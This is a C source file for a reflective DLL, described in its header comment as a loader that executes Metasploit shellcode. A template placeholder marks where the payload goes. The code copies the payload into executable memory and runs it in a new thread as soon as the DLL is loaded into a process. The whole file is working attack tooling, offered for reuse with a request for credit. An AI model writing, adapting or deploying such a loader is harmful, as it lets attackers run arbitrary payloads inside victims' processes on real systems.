//===============================================================================================//
// This DLL will execute Metasploit Shellcode
//===============================================================================================//

/*
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
*/

#include "ReflectiveLoader.h"

{{shellcodehere}}

void ExecuteShellcode()
{
	void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof(buf));
	((void(*)())exec)();
}
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			CreateThread(NULL , 0, (LPTHREAD_START_ROUTINE)ExecuteShellcode, NULL, 0 ,NULL);
			// ExecuteShellcode();
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}